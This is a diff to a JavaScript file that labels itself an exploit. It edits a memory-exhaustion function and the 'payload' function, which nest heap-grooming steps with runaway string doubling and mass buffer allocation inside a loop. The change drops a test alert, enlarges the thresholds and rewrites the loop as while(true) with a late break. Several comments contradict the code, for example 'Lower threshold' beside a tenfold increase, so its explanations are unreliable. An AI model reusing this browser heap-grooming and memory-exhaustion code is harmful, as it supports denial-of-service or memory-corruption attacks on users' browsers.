@@ -39,8 +39,8 @@ function groomHeap() {
 function memExh() {
     let bufferArray = [];
     for (let i = 0; i < 4096; i++) { // Reduced iterations
-        bufferArray.push(new ArrayBuffer(1000000)); // Allocate smaller buffers
-        if (bufferArray.length > 1024) { // Less aggressive clearing
+        bufferArray.push(new ArrayBuffer(500000)); // Allocate smaller buffers
+        if (bufferArray.length > 500) { // Less aggressive clearing
             bufferArray = []; // Clear buffer array to exhaust memory
         }
     }
@@ -48,30 +48,30 @@ function memExh() {
 
 // Step 4: The Exploit Payload Function
 function payload() {
-    alert("Payload");
-    let largeString = "B".repeat(500000); // Adjusted size
+    let largeString = "B".repeat(500000); // Smaller initial string
     let nestedArray = [];
+    let obj = {};
     let iterationCount = 0; // Counter to track number of iterations
 
-    while (iterationCount < 20) { // Limited iterations
+    while (true) {
         // String concatenation
         largeString += largeString;
-        if (largeString.length > 5000000) { // Threshold for reset
-            largeString = "B".repeat(500000); // Reset string
+        if (largeString.length > 50000000) { // Lower threshold for reset
+            largeString = "B".repeat(500000); // Reset string to avoid overflow
         }
 
         memExh(); // Exhaust memory
 
         // Nested arrays
         nestedArray.push([]);
-        if (nestedArray.length > 128) { // Reduced nesting
-            nestedArray = []; // Clear nested arrays
+        if (nestedArray.length > 500) { // Reduced nesting
+            nestedArray = []; // Clear nested arrays to exhaust memory
         }
 
         iterationCount++;
+        if (iterationCount > 50) break; // Limit iterations to avoid endless loop
     }
 }
-
 // Step 5: Perform the Exploit
 function performExploit() {
     let controlledBuffers = initializeHeap(); // Initialize the heap
